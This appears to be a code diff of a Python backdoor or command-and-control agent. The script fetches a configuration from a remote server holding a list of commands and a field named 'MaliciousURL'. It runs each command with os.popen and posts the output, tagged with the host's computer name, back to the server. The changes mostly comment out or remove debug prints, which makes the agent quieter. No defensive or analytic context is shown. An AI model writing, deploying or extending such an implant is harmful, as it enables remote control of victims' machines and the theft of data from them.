@@ -15,39 +15,34 @@ def HttpGetRequest(path, parameters):
     #FOR TLS
     #r = requests.Session()
     r = requests.get(SERVERADDRESS+path ,params=parameters, headers=HEADERS)
-    #print('This is he url: '+r.url)
-    #print('This is the response: ')
-    print(r.text)
     return r.text
 
 def HttpPostRequest(path, parameters):
     #FOR TLS
     #r = requests.Session()
     r = requests.post(SERVERADDRESS+path, data=parameters, headers=HEADERS)
-    #print('This is the response: ')
-    #print(r.text)
     return r.text
 
 def conf():
     #conf = json.loads((HttpGetRequest(CONFIGURATIONPATH,None)))
     conf = ast.literal_eval(HttpGetRequest(CONFIGURATIONPATH,None))
-    print(json.dumps(conf))
+    #print(json.dumps(conf))
     SERVERADDRESS = conf['Server']
     COMMANDSTOEXE = conf['Commands']
     MALICIOUSURL = conf['MaliciousURL']
-    print("This is the conf:")
+    #print("This is the conf:")
     for command in COMMANDSTOEXE:
-
         HttpPostRequest('/Commands',PreperToSend(str(command),RunCommand(str(command))))
 
 
 def RunCommand(command):
-    run = os.popen(command).read()
+    run = os.popen(command)
+    results = run.read()
+    run.close()
     #print(run)
-    return run
+    return results
 
 def PreperToSend(type,str):
-    print('HERE')
     j = json.dumps({'computer':os.environ['COMPUTERNAME'],'type':type,'data':str})
     return j
 
